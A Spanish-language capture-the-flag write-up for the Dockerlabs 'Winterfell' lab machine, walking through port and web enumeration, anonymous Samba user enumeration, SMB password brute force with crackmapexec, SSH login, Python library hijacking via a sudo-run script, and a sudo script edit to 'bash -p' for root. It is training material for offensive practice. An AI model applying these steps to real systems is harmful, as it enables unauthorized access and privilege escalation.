
# Writeup Template: Maquina `[ Winterfell ]`

- Tags: #Winterfell
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Winterfell](https://mega.nz/file/Qaky0DoJ#AfyxhrLvz8n_Kxefe-61c5n81T9CqtGeU_Ybk5Xv0bA)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x winterfell.zip
sudo bash auto_deploy.sh winterfell.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p22,80,139,445 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.61 ((Debian)) ( debianSid )
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```
---

## Enumeracion de [Servicio web Principal]
La direccion url de la web principal:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/dragon/              (Status: 200) [Size: 942]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,txt,sh,html,js
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 1729]
/dragon               (Status: 301) [Size: 309] [--> http://172.17.0.2/dragon/]
```

Si ingresamos a este recurso tenemos la siguiente informacion:
```bash
http://172.17.0.2/dragon/EpisodiosT1
```

Info:
```bash
Estos son todos los Episodios de la primera  temporada de Juego de tronos.
Tengo la barra espaciadora estropeada por lo que dejare los nombres sin espacios, perdonad las molestias

seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

### Enumeracion `SAMBA`
Procedemos a enumerar este servicio:
```bash
enum4linux -S 172.17.0.2
```

Nos devuelve este resultado:
```bash
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
shared          Disk      
IPC$            IPC       IPC Service (Samba 4.17.12-Debian) # 
nobody          Disk      Home Directories
```

Tenemos este recurso, al parecer tiene capacidad de escritura:
```bash
NT_STATUS_CONNECTION_REFUSED listing \*
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
```

### Peligros del Recurso `IPC$` en Samba (Linux/Windows)
El recurso `IPC$` (Inter-Process Communication) en Samba es **altamente sensible** y representa un riesgo crítico de seguridad en entornos vulnerables:
Realizamos una conexion anonima sin credenciales:
```bash
smbclient //<IP>/IPC$ -U "" -N
```

Despues realizaremos una enumeracin sin proporcionar credenciales
```bash
rpcclient -U "" -N <IP>
```

Una ves conectados aplicamos el siguiente comandos para enumerar a los usuarios del sistema:
```bash
enumdomusers
```
### Credenciales Encontradas
- Usuario: `[ jon ]`
- Contraseña: `[  ]`
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos al usaurio: **( jon )** aplicaremos un ataque de fuerza bruta con **crackmapexec** sobre el usuario objetvio: usaremos estas frases como posibles passwords. y el archivo lo llamaremos **password.txt**
```bash
seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

### Ejecucion del Ataque
```bash
# Comandos para explotación
crackmapexec smb 172.17.0.2 -u jon -p password.txt
```

ahora tenemos las credenciales de acceso de este usuario:
```bash
SMB         172.17.0.2      445    0A1E62A2CAAD     [*] Windows 6.1 Build 0 (name:0A1E62A2CAAD) (domain:0A1E62A2CAAD) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    0A1E62A2CAAD     [+] 0A1E62A2CAAD\jon:seacercaelinvierno
```

Ahora nos conectaremos al servicio apuntando a los servicios compartidos para este usuario:
```bash
smbclient //172.17.0.2/shared -U jon%seacercaelinvierno
```

Dentro listamos los recursos encontrando este:
```bash
 proteccion_del_reino
```

Descargamos su contenido:
```bash
get proteccion_del_reino
```

Ahora vemos su contenido:
```bash
 Aria de ti depende que los caminantes blancos no consigan pasar el muro. 
 Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo. Se encuentra cifrado en un lenguaje antiguo y dificil de entender.
 Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```

Sabiendo que **base64** procedemos a desencriptarla:
```bash
echo "aGlqb2RlbGFuaXN0ZXI=" | base64 -d
```

Resultado:
```bash
hijodelanister
```
### Intrusion
Realizaremos la intrusion por ssh y colocamos la contrasena de este usuraio: ( hijodelanister )
```bash
ssh-keygen -R 172.17.0.2 && ssh jon@172.17.0.2
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l

User jon may run the following commands on 0a1e62a2caad:
    (aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py # Tenemos un script que nos permitira escalar a este usuario
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/python3 ]`
- Credenciales de usuario: `[ aria ]:[ ]`

### Explotacion de Privilegios

###### Usuario `[ Aria ]`:
Revisando el script vemos que esta emplenado la libreria: **( hashlib )** y para poder migrar a el usuario **Aria** tendremos que secuestrar esa libreria de la siguiente manera:

###### hashlib
Crearemos nuestro script propio que sustituira a la libreria legitima, Con las siguientes instrucciones:
```bash
import os
os.system("/bin/bash")
```

Sabiendo que python3 buscara primero por defecto en el directorio actual de trabajo:
```bash
python3 -c 'import sys; print(sys.path)'
['', '/usr/lib/python311.zip', '/usr/lib/python3.11', '/usr/lib/python3.11/lib-dynload', '/usr/local/lib/python3.11/dist-packages', '/usr/lib/python3/dist-packages']
```

Ya creado el script: **( hashlib.py )** que contiene nuestras instrucciones para poder migrar a este usuario, Ejecutamos
```bash
# Comando para escalar al usuario: ( aria )
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```
###### Usuario `[ Aria ]`:
Ahora que tenemos una shell procedemos a enumerar el sistema para migrar a **daenerys**
```bash
sudo -l

User aria may run the following commands on 0a1e62a2caad:
    (daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls # Tenemos una via potencial de ver los archivos de este usuario
```

Ahora nos aprovecharemos para **listar** y ver el contenido de sus **archivos** de este usuario
```bash
sudo -u daenerys /usr/bin/ls /home/daenerys

mensajeParaJon # Resultado
```

Ahora usaremos el otro binario para ver su contenido:
```bash
sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
```

El contenido es:
```bash
Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.

!drakaris!
```

```bash
# Comando para escalar al usuario: ( daenersy )
su daenerys # ( drakaris )
```

###### Usuario `[ daenersy ]`:
Ahora que tenemos una shell procedemos a enumerar el sistema para migrar a **root**
```bash
sudo -l

User daenerys may run the following commands on 0a1e62a2caad:
    (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

Modificaremos el script para que cuando se ejecute nos de una **bash** con privilegios de **root**
```bash
nano /home/daenerys/.secret/.shell.sh
```

Su contenido:
```bash
bash -p
```

Ahora ejecutamos el **script**
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@0a1e62a2caad:/home/daenerys# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a enumerar el servicio **SAMBA** 
2. Apredimos a realizar fuerza bruta para este servicio
3. Aprendimos a realizar el secuestro de librerias de **python**

## Recomendaciones de Seguridad
- Evitar compartir archivos con credenciales de acceso por **SAMBA**